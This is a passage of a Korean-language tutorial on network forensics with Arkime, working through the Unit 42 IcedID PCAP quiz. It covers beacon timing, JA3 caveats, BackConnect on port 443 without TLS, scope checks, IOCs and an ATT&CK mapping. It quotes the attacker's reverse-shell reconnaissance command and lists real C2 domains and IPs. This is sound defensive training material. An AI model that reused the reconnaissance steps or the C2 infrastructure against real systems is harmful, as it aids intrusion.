    - 3c293bdf2a25c07559b560ba86debc77 (77회): askamoshopsi.com 3 + skansnekssky.com 69
                                              + self.events.data.microsoft.com 5  ← 윈도우 원격 분석
    - 6a5d235ee78c6aede6a61448b4e9ff1e (1회):  spakernakurs.com (20:12:16)

10.4.19.138: 3c293bdf... 0회
```

**결과 읽기:**

- **감염 뒤 새 JA3가 56개나 생겼지만, 그중 54개는 정상 Edge 통신**입니다. 최신 Chrome/Edge(110 이후)는 TLS 확장(extension)의 **순서를 매번 무작위로 섞어서** 보냅니다. JA3는 이 순서까지 넣어서 해시를 만드니, **같은 브라우저인데도 연결마다 JA3가 달라져요.** 그래서 "JA3 개수가 늘었다"는 것만으로는 감염 증거가 될 수 없습니다. 이 문제를 고친 게 **JA4**(확장을 정렬한 뒤 계산)예요. Arkime 최신 버전에는 `tls.ja4` 필드가 있습니다.
- **IcedID의 C2 JA3(`3c293bdf…`)는 윈도우 자체 원격 분석(`self.events.data.microsoft.com`)과 같은 값**입니다. IcedID가 윈도우 기본 통신 기능(WinHTTP/Schannel)을 쓰기 때문이에요. RedLine 사례와 똑같은 교훈입니다. **"이 JA3는 나쁜 JA3"라고 차단 목록에 넣으면 윈도우 정상 통신도 같이 막힙니다.**
- 반면 **`6a5d235e…`(spakernakurs.com)는 이 PC에서 딱 한 번, 후속 활동 직전에** 나온 새 JA3입니다. 강사님이 말한 "감염 뒤 새 JA3"가 **실제로 의미 있었던 경우**예요. 다만 이것도 JA3 하나만 보고 안 게 아니라, **처음 보는 도메인 + 자체 서명 인증서 + 긴 세션 + 직후 BackConnect**가 같이 있어서 의미가 생긴 겁니다.
- 결론: **JA3는 "같은 PC 안에서, 목적지(SNI)·인증서와 같이" 읽어야** 합니다. 10.4.19.138에는 `3c293bdf…`가 한 번도 없는 것처럼, 같은 윈도우라도 PC(빌드·설정)마다 JA3가 다를 수 있으니 다른 PC와 바로 비교하는 것도 조심해야 해요.

---

## 8단계 — 비콘 주기 재기 { #beacon }

**목적:** `skansnekssky.com` 69번 접속이 사람이 아닌 **프로그램의 규칙적인 체크인(비콘)**인지 확인합니다.

**쿼리:**

```text
ip.dst == 217.199.121.56
```

Sessions에서 **Start Time 오름차순**으로 정렬하고, 열에 **Src Databytes / Dst Databytes**를 추가합니다(열 머리글 오른쪽 메뉴 → 필드 추가). **SPI Graph** 탭에서 `ip.dst`를 고르면 시간 그래프로도 볼 수 있어요.

**실제 결과 (일부):**

```text
Start      Src DB  Dst DB
15:36:44   4,717   2,324    ← 첫 접속(등록): 크다
15:41:42     581   1,707
15:46:45     581   1,707
15:51:47     581   1,707
15:56:49     581   1,707
16:01:50     581   1,707
 ...         (5분 간격 계속)
17:52:51     585   1,707
 ...
19:28:30     585   1,707
19:32:00   1,100   1,707    ← 한 번 간격이 3분 30초, 보낸 양도 조금 큼
19:37:02     585   1,707
 ...
21:17:46     585   1,707    ← 마지막 (캡처 끝 21:22:36)

69 sessions, start-to-start interval: median 302 s, min 210 s, max 307 s
```

**결과 읽기:**

- **거의 정확히 5분(약 300초 + 몇 초)마다** 접속합니다. 6시간 동안 쉬지 않아요. 사람이 웹사이트를 이렇게 쓰지는 않습니다. 전형적인 **비콘**입니다.
- 크기도 거의 **매번 같습니다**(보냄 581~585, 받음 1,707). "새 명령 있어?" → "없어"를 반복하는 모양이에요. **첫 접속만 크다**(4,717바이트)는 것도 비콘의 흔한 특징입니다. 처음에 PC 정보를 등록하기 때문이에요.
- 매번 새 TLS 연결을 맺고 금방 끊는 **"짧고 자주"형 비콘**입니다. Trickbot 사례의 "몇 분씩 붙잡는" 형태와 다릅니다([비콘의 두 종류](arkime-only-credential-theft-tls-c2.md) 참고).
- DNS는 매번 하지 않고 **약 30분마다** 다시 조회합니다(17:07, 17:52, 18:23, 18:53 …). DNS 캐시 때문이라 DNS 개수만 세면 비콘 횟수를 놓칩니다. **세션 단위로 세야** 해요.

!!! tip "비콘을 빨리 찾는 일반적인 방법"
    1. `ip.src == <PC> && protocols == tls`로 TLS를 모으고 SPI View에서 `ip.dst`의 **세션 수**를 봅니다. 정상 서비스가 아닌데 수십 번 나오는 IP가 후보예요.
    2. 후보 IP로 검색해서 Start Time 간격과 Databytes가 **일정한지** 봅니다.
    3. 간격이 일정 + 크기가 일정 + 자체 서명 인증서 → 거의 확실한 C2.

---

## 9단계 — 443인데 TLS가 아닌 것: 후속 활동 찾기 (Q6) { #non-tls-443 }

**목적:** Q6 "후속 활동"을 찾습니다. IcedID는 감염 뒤 **BackConnect**(원격 조종), **VNC**, **Cobalt Strike** 같은 걸 추가로 내려받는 경우가 많아요. 그중 BackConnect는 2023년 4월부터 **443 포트를 쓰지만 TLS가 아닌** 통신을 했습니다. 그러니 "443인데 TLS가 아닌 세션"을 찾으면 됩니다.

**쿼리:**

```text
ip.src == 10.4.19.136 && port.dst == 443 && protocols != tls
```

| 조각 | 뜻 |
|---|---|
| `port.dst == 443` | HTTPS 포트로 간 연결 |
| `protocols != tls` | Arkime가 **TLS로 인식하지 못한** 세션. 443인데 TLS가 아니면 이상함 |

**실제 결과:**

```text
20:48:00 – 21:22:36  10.4.19.136:51534 → 193.149.176.100:443   pkts 74/73   databytes 827 / 629
20:49:11 – 20:49:22  10.4.19.136:51535 → 193.149.176.100:443   pkts 19/21   databytes 727 / 41
20:49:33 – 20:49:46  10.4.19.136:51537 → 193.149.176.100:443   pkts 12/15   databytes 770 / 26
15:27:07 – 20:59:30  10.4.19.136:49769 → 40.83.247.108:443      (Microsoft, 아래 설명)
15:36:58             10.4.19.136:50171 → 20.25.241.18:443       (Microsoft, 아래 설명)
```

**결과 읽기:**

- **193.149.176.100으로 세 세션**이 있습니다. 이 IP는 **DNS 조회가 없습니다**(IP가 프로그램에 박혀 있음). 첫 세션이 20:48:00에 열리고 1분쯤 뒤 두 개가 더 열려요.
- Microsoft 두 세션은 Source Raw의 첫 바이트가 `17 03 03`입니다. **TLS의 "데이터" 레코드**예요. 연결이 캡처 전에 맺어졌거나 핸드셰이크(`16 03 …`)가 잡히지 않아서 Arkime가 TLS로 못 붙인 것뿐, 진짜 TLS입니다. 이렇게 **첫 바이트로 구별**할 수 있어요.
- 193.149.176.100 세션의 Source Raw 첫 부분은 `f8 7f 92 46 …`처럼 **TLS 모양(`16 03`, `17 03`)이 전혀 아닙니다.** 443을 쓰지만 TLS가 아닌 **자체 프로토콜**입니다.

| 첫 바이트 | 뜻 |
|---|---|
| `16 03 0x` | TLS 핸드셰이크 시작 (정상 HTTPS의 첫 패킷) |
| `17 03 03` | TLS 데이터 (중간부터 잡힌 HTTPS) |
| 그 밖의 값 | TLS 아님 → 443을 빌려 쓰는 다른 프로토콜 |

---

## 10단계 — BackConnect 읽기: 공격자가 친 명령 { #backconnect }

**목적:** 세 세션 각각에서 무엇이 오갔는지 읽습니다. BackConnect는 앞부분만 이진 값이고, 그 뒤 명령과 결과는 **평문**이라 그대로 읽을 수 있어요.

**쿼리:**

```text
ip.dst == 193.149.176.100
```

세 세션을 하나씩 펼치고 **ASCII**로 봅니다. 방향은 색으로 구별해요(빨강 = PC → 서버, 파랑 = 서버 → PC). 길면 **Source Raw / Destination Raw**로 받아서 CyberChef **Strings**로 봅니다.

### 세션 1 (포트 51534) — 제어 채널

```text
20:48:00  PC → 서버  249 bytes (이진, 등록)
20:48:00  서버 → PC   17 bytes
20:49:00  PC → 서버   17 bytes      ← 이후 정확히 60초마다 17바이트씩 주고받음
20:49:11  서버 → PC   17 bytes      ← 바로 이 순간 세션 2가 열림
20:49:33  서버 → PC   17 bytes      ← 바로 이 순간 세션 3이 열림
 ...
21:22:36  (캡처 끝까지 1분 간격 유지)
```

- **1분마다 17바이트**를 주고받는 "살아 있니?" 신호(keep-alive)입니다. 공격자가 원할 때 바로 명령을 내릴 수 있게 **연결을 계속 열어 두는** 거예요.
- 서버가 17바이트를 보낸 **바로 그 초에** 새 세션이 열립니다. 제어 채널이 "셸 열어", "파일 관리자 열어"를 지시한 것으로 보여요.

### 세션 2 (포트 51535) — 원격 셸

```text
20:49:11  PC → 서버  249 bytes (이진 헤더)
20:49:12  PC → 서버  Active code page: 65001
                     c:\>
20:49:17  서버 → PC  net group "Domain Computers" /domain
20:49:17  PC → 서버  The request will be processed at a domain controller for domain boogienights.live.

                     Group name     Domain Computers
                     Comment        All workstations and servers joined to the domain

                     Members
                     -------------------------------------------------------------------------------
                     DESKTOP-JAL4D68$         DESKTOP-RETP4BU$         DESKTOP-SFF9LJF$
                     The command completed successfully.
                     c:\>
```

- `Active code page: 65001`과 `c:\>`는 **윈도우 명령 프롬프트(cmd.exe)**가 뜰 때 나오는 글자입니다. PC가 공격자에게 **셸을 넘겨준** 거예요(역방향 셸).
- 공격자가 친 명령: **`net group "Domain Computers" /domain`** — "이 도메인에 가입된 컴퓨터 목록을 보여 줘". 결과로 **3대 이름이 전부** 공격자에게 갔습니다. 다음 표적을 고르는 **정찰**이에요.
- 같은 시각(20:49:17)에 10.4.19.136 → DC(10.4.19.19:445) **SMB 세션**이 하나 있습니다(보냄 10,200 / 받음 7,165바이트). `net group … /domain`이 DC에 물어볼 때 생기는 통신이에요. **명령과 네트워크 흔적이 시간상 딱 맞습니다.**
- 사람이 직접 친 것이라 명령 사이 간격이 몇 초씩 됩니다(20:49:12 프롬프트 → 20:49:17 명령). 이걸 **hands-on-keyboard**(공격자가 직접 조작)라고 해요.

### 세션 3 (포트 51537) — 파일 관리자

```text
20:49:34  서버 → PC  DISK
20:49:34  PC → 서버  C:\|548934774784|512594530304|3|
                     Z:\|257024847872|237367189504|4|
20:49:37  서버 → PC  CDDIR Z:\
20:49:37  PC → 서버  Z:\|||  ..||1620461211|22
20:49:41  서버 → PC  CDDIR C:\
20:49:41  PC → 서버  C:\|||  $Recycle.Bin||1651901090|22  Documents and Settings||1681839040|9238
                     DumpStack.log.tmp|12288|1681838906|38  pagefile.sys|3087007744|1681838906|38
                     PerfLogs||1651901090|16  Program Files||1651901090|17  Program Files (x86)||...
                     ProgramData||...  Recovery||...  swapfile.sys|16777216|...  System Volume Information||...  Users||...
```

**쿼리 해설 — 형식 읽는 법:** 한 줄이 `이름|크기|시간|속성`입니다.

| 값 | 뜻 |
|---|---|
| `DISK` | "드라이브 목록 줘" |
| <code>C:\&#124;548934774784&#124;512594530304&#124;3&#124;</code> | C: 드라이브, 전체 약 549GB, 남은 공간 약 513GB, 종류 **3 = 고정 디스크** |
| <code>Z:\&#124;…&#124;4&#124;</code> | Z: 드라이브, 종류 **4 = 네트워크 드라이브** (3단계의 `For_Shared_Drive` 공유로 보임) |
| `CDDIR C:\` | "C:\ 폴더 내용 줘" |
| `1681839040` | UNIX 시간 (CyberChef From UNIX Timestamp → 2023-04-18 17:30:40 UTC) |

**결과 읽기:**

- 공격자가 **드라이브 목록 → Z:\ → C:\** 순서로 둘러봤습니다. 아직 파일을 **올리거나 내려받지는 않았어요**(세션이 20:49:46에 끝나고, 바이트 수도 수백 바이트).
- Q6의 답: **후속 악성 활동이 있었고, 그건 IcedID BackConnect**입니다. 공격자가 원격 셸로 도메인 컴퓨터 목록을 보고, 파일 관리자로 드라이브와 폴더를 살폈습니다.
- 이 PCAP에서 **Cobalt Strike나 VNC 흔적은 없습니다**(Unit 42도 같은 결론). 하지만 도메인 컴퓨터 목록을 본 건 **다음 단계(측면 이동, 랜섬웨어 준비)로 가기 직전**이라는 신호예요. 실제 상황이라면 이 시점에 바로 격리해야 합니다.

---

## 11단계 — 범위 확인과 두 번째 PC { #scope }

**목적:** (1) 다른 PC도 같은 IOC에 접속했는지, (2) 10.4.19.136이 다른 PC로 퍼지려 했는지, (3) 2단계에서 표시해 둔 10.4.19.138이 무엇을 했는지 확인합니다.

### IOC에 접속한 다른 PC

```text
ip.dst == [80.77.25.175, 142.251.32.234, 192.153.57.233, 104.168.53.18, 217.199.121.56, 193.149.176.100] && ip.src != 10.4.19.136
```

**실제 결과:** `0 sessions`. 10.4.19.143은 **외부로 나간 세션 자체가 없습니다.**

### 측면 이동

```text
ip.src == 10.4.19.136 && ip.dst == 10.4.19.0/24 && ip.dst != 10.4.19.19
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == 10.4.19.0/24` | 내부망으로 간 연결 |
| `ip.dst != 10.4.19.19` | DC는 제외 |

**실제 결과:** 브로드캐스트·멀티캐스트 말고는 **0개**. 10.4.19.136이 다른 클라이언트(.138, .143)에 SMB·RDP·RPC로 간 적이 없습니다.

- DC로는 SMB(`IPC$`, `SYSVOL`)가 **약 15분마다** 있는데, 이건 윈도우가 그룹 정책을 확인하는 **정상 동작**입니다. 시간이 규칙적이라 비콘처럼 보일 수 있으니 헷갈리지 마세요. 목적지가 **DC**이고 공유 이름이 `IPC$`·`SYSVOL`이면 정상입니다.

### 두 번째 PC: 10.4.19.138 { #second-host }

2단계에서 본 `cotecsecuritygroup.com`을 따라갑니다.

```text
ip.src == 10.4.19.138 && host.http == cotecsecuritygroup.com
```

**실제 결과:**

```text
17:17:10  10.4.19.138 → 66.29.147.117:80
GET /wicd/643d0491bcea1.zip HTTP/1.1
Host: cotecsecuritygroup.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Edg/112.0.1722.48

HTTP/1.1 200 OK
Server: Apache
Content-Disposition: attachment; filename="643d0491bcea1.zip"
Content-Encoding: gzip
Content-Length: 5673
Content-Type: application/zip
```

응답 본문을 Destination Raw로 받아 CyberChef **Gunzip** → **Unzip**(파일 목록만 보기, 실행 금지):

```text
Complaint_Copy_634917.wsf    16,173 bytes   (2023-04-19 15:16:56)
```

그리고 28초 뒤:

```text
ip.src == 10.4.19.138 && ip.dst == 85.239.53.73
```

```text
17:17:38 – 17:18:53  10.4.19.138:49773 → 85.239.53.73:80   SYN ×5, RST ×1, data 0   (DNS 조회 없음)
```

**결과 읽기:**

- 10.4.19.138의 사용자가 Edge로 **`/폴더/16진수.zip`** 모양의 파일을 받았고, 안에는 **`.wsf`(윈도우 스크립트 파일)**가 들어 있습니다. 문서처럼 보이는 이름(`Complaint_Copy`, "민원 사본")에 스크립트 확장자 — 전형적인 미끼예요. 바로 전(17:12~17:15)에 조회한 `*.joansstudio.store` 이름은 **존재하지 않는 이름(NXDOMAIN)**이었습니다.
- 이 모양(**zip 안의 .wsf, 16진수 zip 이름**)은 바로 이날(2023-04-19) 보고된 **Qakbot 배포 방식과 같습니다.** 다만 계열은 **추정**이에요.
- 28초 뒤 **DNS 없이 IP로 직접** 85.239.53.73:80에 접속을 **5번 시도했지만 실패**(데이터 0, RST)했습니다. 스크립트가 실행돼서 다음 단계를 받으려다 실패한 것일 **가능성**이 있습니다(추정 — 스크립트가 실행됐는지는 네트워크만으로 확정 불가).
- 그 뒤 10.4.19.138에는 수상한 통신이 없습니다. 그래서 **"감염된 PC는 한 대(10.4.19.136)"**라는 퀴즈의 설명과 맞아요. 하지만 실제 업무라면 **"깨끗함"이 아니라 "추가 분석 필요"**로 적고 호스트 점검을 요청해야 합니다. 그래서 보고서에도 **Further Analysis Required**로 남깁니다.

---

## 전체 결론 { #conclusion }

```text
15:20:41  (cookie time) earlier visit to the TDS — before the capture starts
15:31:07  user opens hxxp://80.77.25.175/main.php in Edge → 302 to Firebase Storage
15:31:14  Scan_Inv.zip downloaded over HTTPS (~273 KB)
15:34:33  Windows fetches SSL.com root certificate (user likely runs Scan_Inv.exe)
15:35:39  installer → skigimeetroc.com, cookie with host/user/SID → fake gzip 520 KB
15:36:41  HTTPS C2 starts: askamoshopsi.com (+1.9 MB), skansnekssky.com every 5 min
20:12:16  new C2 session spakernakurs.com, new JA3
20:48:00  BackConnect to 193.149.176.100:443 (not TLS)
20:49:17  operator runs net group "Domain Computers" /domain
20:49:34  operator lists drives and C:\
21:22:36  capture ends — beacon and BackConnect still alive
```

## 타임라인 { #timeline }

| UTC (2023-04-19) | 이벤트 |
|---|---|
| 15:20:41 | (쿠키 안의 시간) 캡처 전에 TDS 첫 방문으로 추정 |
| 15:26:28 | 캡처 시작 |
| 15:31:07 | DESKTOP-SFF9LJF(10.4.19.136) Edge → `hxxp://80.77.25[.]175/main.php` → 302 |
| 15:31:14 | Firebase Storage에서 `Scan_Inv.zip` HTTPS 다운로드(273,619B) |
| 15:34:33 | `Microsoft-CryptoAPI` → `www.ssl.com` 루트 인증서(실행 파일 서명 확인 추정) |
| 15:35:39 | `skigimeetroc[.]com` GET / (User-Agent 없음, IcedID 쿠키) → `application/gzip` 520,803B |
| 15:36:41–15:37:50 | `askamoshopsi[.]com` 104.168.53.18 HTTPS 3회, 1.9MB 다운로드 |
| 15:36:44 | `skansnekssky[.]com` 217.199.121.56 첫 비콘(4,717B) |
| 15:41 ~ 21:17 | 5분마다 비콘(69회) |
| 17:17:10 | (다른 PC) DESKTOP-RETP4BU(10.4.19.138) `643d0491bcea1.zip`(.wsf) 다운로드 |
| 17:17:38 | (다른 PC) 85.239.53.73:80 접속 실패 |
| 20:12:16 | `spakernakurs[.]com` 104.168.53.18 새 세션, 새 JA3 |
| 20:48:00 | BackConnect 제어 채널 193.149.176.100:443 |
| 20:49:11 | BackConnect 원격 셸 |
| 20:49:17 | `net group "Domain Computers" /domain` (+ DC로 SMB) |
| 20:49:33 | BackConnect 파일 관리자: `DISK`, `CDDIR Z:\`, `CDDIR C:\` |
| 21:22:36 | 캡처 끝 (비콘·제어 채널 계속 살아 있음) |

## 침해 지표(IOC) { #iocs }

| 종류 | 지표 | 역할 |
|---|---|---|
| URL | `hxxp://80.77.25[.]175/main.php` | TDS 리다이렉트 |
| URL | `hxxps://firebasestorage.googleapis[.]com/v0/b/serene-cathode-377701.appspot.com/o/XSjwp6O0pq%2FScan_Inv.zip?alt=media&token=a716bdce-1373-44ed-ae89-fdabafa31c61` | `Scan_Inv.zip` (정상 서비스 악용) |
| 도메인 / IP | `skigimeetroc[.]com` / `192.153.57[.]233` | gzip 로더 |
| 도메인 / IP | `askamoshopsi[.]com`, `spakernakurs[.]com` / `104.168.53[.]18` | HTTPS C2 |
| 도메인 / IP | `skansnekssky[.]com` / `217.199.121[.]56` | HTTPS C2 비콘 |
| IP:포트 | `193.149.176[.]100:443` (TLS 아님) | BackConnect |
| 인증서 | `CN=localhost, O=Internet Widgits Pty Ltd, ST=Some-State, C=AU` (자체 서명, 2023-04-11 발급) | C2 서버 3개 공통 |
| 쿠키 이름 | `__gads`, `_gid`, `_u`, `__io`, `_ga`, `_gat` (User-Agent 없는 요청) | IcedID 설치 파일 |
| JA3 | `3c293bdf2a25c07559b560ba86debc77` (윈도우 기본값과 같음 — 차단용 아님), `6a5d235ee78c6aede6a61448b4e9ff1e` | 참고용 |
| SHA256 (Unit 42) | `fc96c893a462660e2342febab2ad125ce1ec9a90fdf7473040b3aeb814ba7901` | `Scan_Inv.zip`(262,343B, 비밀번호 1235) |
| SHA256 (Unit 42) | `bd24b6344dcde0c84726e620818cb5795c472d9def04b259bf9bff1538e5a759` | `Scan_Inv.exe`(333,408B, IcedID 설치 파일) |
| (다른 PC) URL / IP | `hxxp://cotecsecuritygroup[.]com/wicd/643d0491bcea1.zip` / `66.29.147[.]117`, `85.239.53[.]73:80` | zip/.wsf 미끼(Qakbot 계열 추정) |

해시 두 개는 PCAP에서 계산할 수 없어서(HTTPS 다운로드) Unit 42 해설에서 가져온 값입니다.

!!! warning "공식 해설의 IP 오타"
    Unit 42 해설의 IOC 목록은 gzip 로더를 `192.153.57[.]223`, TDS를 `80.77.24[.]175`로 적었지만, PCAP의 DNS 응답과 세션은 **192.153.57.233**, **80.77.25.175**입니다. IOC는 **항상 원본 데이터로 다시 확인**하세요.

## ATT&CK 매핑 { #attack }

| 기법 | 증거 |
|---|---|
| T1566.002 Phishing: Spearphishing Link (추정) | IP로 된 링크를 브라우저로 엶. 링크 출처는 PCAP에 없음 |
| T1608.001 / T1105 Ingress Tool Transfer | Firebase Storage에 올린 `Scan_Inv.zip`, gzip 로더 |
| T1027.002 / T1027 Obfuscated Files | 비밀번호 걸린 zip, gzip으로 위장한 암호화 페이로드 |
| T1204.002 User Execution: Malicious File | 사용자가 `Scan_Inv.exe` 실행(Unit 42) |
| T1082 System Information Discovery, T1033 System Owner/User Discovery | 쿠키의 OS 빌드·CPU·호스트·사용자·SID |
| T1071.001 Web Protocols, T1573 Encrypted Channel | 자체 서명 HTTPS C2, 5분 비콘 |
| T1095 Non-Application Layer Protocol | BackConnect: 443 위의 TLS 아닌 자체 프로토콜 |
| T1059.003 Windows Command Shell | BackConnect 원격 셸 |
| T1018 Remote System Discovery, T1069.002 Domain Groups | `net group "Domain Computers" /domain` |
| T1083 File and Directory Discovery | `DISK`, `CDDIR` |

## 앞의 두 사례와 비교 { #compare }

| | [Trickbot (2020)](arkime-only-credential-theft-tls-c2.md) | [RedLine (2023)](redline-stealer-powershell-nettcp-c2.md) | IcedID (2023) |
|---|---|---|---|
| 캡처 길이 | 약 44분 | 36초 | **약 6시간** |
| 시작 | 스크립트가 EXE 다운로드 | `.ps1` 실행 | **IP 링크 → TDS 302 → Firebase zip** |
| 페이로드 위장 | `.png` 이름의 EXE | `.jpg` 이름의 EXE | **`application/gzip` 위장 + 비밀번호 zip** |
| 첫 체크인 | URI에 호스트이름·봇 ID | URI에 `status=start&av=` | **쿠키에 hex로 호스트·사용자·SID** |
| C2 | HTTP POST + 자체 서명 TLS(447/449) | net.tcp, 포트 12432, 평문 | **자체 서명 HTTPS(443), 5분 비콘** |
| 인증서 | 자체 서명 `example.com` | Let's Encrypt(정상) | **자체 서명 `localhost`/Internet Widgits** |
| 비콘 | 길게 붙잡는 형 | 없음(한 번 업로드) | **짧고 자주(5분)** |
| 후속 | 정찰 + SMB 측면 이동 시도 | 없음 | **BackConnect: 원격 셸, 파일 관리자** |
| JA3 | — | 새 JA3 없음(윈도우와 같음) | C2 JA3 = 윈도우와 같음, **후속 직전 새 JA3 1개**, Edge는 매번 새 JA3 |
| 찾는 열쇠 | 이상한 포트·URI | 모르는 포트 하나 | **DNS의 이상한 이름 → 인증서 → 주기 → 443인데 TLS 아님** |

세 사례 공통으로 **IP 직접 접속, 이름과 내용이 안 맞는 파일, 자체 서명 인증서, 일정한 주기**가 핵심 단서였습니다. 그리고 IcedID는 **"정상 포트(443)와 정상 서비스(Firebase) 안에 숨는다"**는 점에서 한 단계 어려워요.

---

## Unit 42 공식 정답과 대조 { #official-answers }

| 질문 | 이 분석 | Unit 42 정답 | 일치 |
|---|---|---|---|
| 감염 시작 | 2023-04-19 15:31 UTC (15:31:07) | 2023-04-19 15:31 UTC | ✓ |
| IP | 10.4.19.136 | 10.4.19[.]136 | ✓ |
| MAC | 14:58:d0:2e:c5:ae | 14:58:d0:2e:c5:ae | ✓ |
| 호스트이름 | DESKTOP-SFF9LJF | DESKTOP-SFF9LJF | ✓ |
| 사용자 | csilva (Cornelius Silva) | csilva (Cornelius Silva, LDAP) | ✓ |
| 후속 활동 | BackConnect (193.149.176.100:443) | BackConnect | ✓ |

이 페이지에서 **더 본 것**: TDS 쿠키 안의 15:20:41(캡처 전 방문 추정), `_u`·`__io`·`_gat` 쿠키 해독, 비콘 주기 302초, BackConnect 세 세션의 역할과 실제 명령, JA3 비교, 그리고 10.4.19.138의 zip/.wsf 다운로드. 마지막은 퀴즈 범위 밖이지만 실제 업무라면 꼭 따로 보고해야 할 내용입니다.

---

## 복사용 쿼리 모음 { #query-sheet }

`<…>`를 바꿔서 쓰세요.

**PC 정체 (DHCP가 없을 때)**

```text
protocols == dhcp
```

```text
ip.src == <internal-CIDR> && protocols == krb5
```

```text
ip.src == <internal-CIDR> && port.dst == [137, 138]
```

```text
ip.src == <host-IP> && ip.dst == <DC-IP> && port.dst == 389
```

**수상한 이름 → 감염 PC 좁히기**

```text
ip.src == <internal-CIDR> && protocols == dns
```

```text
host.dns == [<domain-1>, <domain-2>, <domain-3>]
```

**평문 HTTP**

```text
ip.src == <host-IP> && protocols == http
```

```text
host.http == <IP-or-domain>
```

**HTTPS C2**

```text
ip.src == <host-IP> && host.http == [<domain-1>, <domain-2>]
```

```text
cert.issuer.on == "Internet Widgits Pty Ltd"
```

```text
tags == cert:self-signed && ip.src == <host-IP>
```

```text
ip.src == <host-IP> && protocols == tls
```

**비콘**

```text
ip.dst == <C2-IP>
```

**443인데 TLS가 아닌 것 (BackConnect 같은 것)**

```text
ip.src == <host-IP> && port.dst == 443 && protocols != tls
```

**범위**

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

**사용한 CyberChef 레시피**

| 레시피 | 용도 |
|---|---|
| JWT Decode / From Base64 (URL safe) | TDS 쿠키 `34ab8=` |
| From UNIX Timestamp | JWT 안의 시간, 파일 관리자 목록의 시간 |
| From Hex | IcedID `_u` 쿠키 → 호스트이름, 사용자 |
| To Hex | 응답 첫 바이트(`1f 8b 08 08` gzip), 세션 첫 바이트(`16 03`/`17 03`) 확인 |
| Strings | BackConnect Raw에서 명령·결과 뽑기 |
| Gunzip → Unzip | 다른 PC가 받은 zip의 **파일 목록만** 보기 |
| Defang URL / Defang IP | 보고서에 IOC 적을 때 |

---

## 교훈 { #lessons }

- **긴 PCAP은 걸러내서 봅니다.** 6시간짜리는 눈으로 못 훑어요. DNS 이름 목록에서 정상(Microsoft, 내부)을 빼고 남는 것부터 보세요.
- **DHCP가 없어도 PC 정체는 찾을 수 있습니다.** Kerberos 컴퓨터 계정(`$`), NetBIOS, `mac.src` — 그리고 악성코드가 직접 보낸 정보(쿠키)까지.
- **IP로 된 URL, User-Agent 없는 요청, 첫 방문인데 쿠키가 있는 요청**은 모두 "사람이 아닌 것"의 표시입니다.
- **정상 서비스(Firebase)도 악용됩니다.** 도메인이 정상인지보다 **"누가 거기로 보냈나"**(302의 출처)를 보세요.
- **OpenSSL 기본값 인증서(`Internet Widgits Pty Ltd`)는 그 자체로 강한 단서**입니다. `cert.issuer.on`으로 바로 찾을 수 있어요.
- **비콘은 간격과 크기가 일정합니다.** 세션 단위로 세세요. DNS는 캐시 때문에 덜 나옵니다.
- **443이라고 다 TLS는 아닙니다.** `port.dst == 443 && protocols != tls`, 그리고 첫 바이트(`16 03`/`17 03`)로 구별하세요.
- **JA3 "개수 변화"는 최신 브라우저 때문에 거의 의미가 없습니다**(Edge는 연결마다 JA3가 바뀜). 대신 **같은 PC 안에서 처음 보는 JA3 + 처음 보는 도메인 + 자체 서명** 조합을 보세요. 가능하면 JA4를 쓰세요.
- **명령과 네트워크 흔적을 시간으로 맞춰 보세요.** `net group … /domain`(20:49:17)과 DC로 간 SMB(20:49:17)가 같은 초입니다.
- **퀴즈 범위 밖도 봅니다.** "감염 PC는 한 대"라는 결론이 나와도, 다른 PC의 이상한 다운로드는 따로 보고서로 남기세요.

## 참고 { #references }

- [Wireshark Quiz: IcedID (Cold as Ice) — Unit 42](https://unit42.paloaltonetworks.com/wireshark-quiz-icedid/) — 문제와 PCAP 위치
- [Answers to Unit 42 Wireshark Quiz for IcedID](https://unit42.paloaltonetworks.com/wireshark-quiz-icedid-answers/) — 공식 정답, IOC, 해시
- [IcedID GZIPLOADER Analysis — Binary Defense](https://binarydefense.com/resources/blog/icedid-gziploader-analysis) — 가짜 gzip 단계
- [ICEDID network infrastructure — Elastic Security Labs](https://www.elastic.co/security-labs/icedids-network-infrastructure-is-alive-and-well) — 쿠키 값의 뜻
- [IcedID's updated photoloader — sysopfb](https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html) — `_u`, `_gat`, `__io`, `_gid` 설명
- [2023-04-19 Qakbot activity — malware-traffic-analysis.net](https://www.malware-traffic-analysis.net/2023/04/19/index.html) — 같은 날 zip/.wsf 배포
- [malware-traffic-analysis.net 연습 문제 목록](https://www.malware-traffic-analysis.net/training-exercises.html)
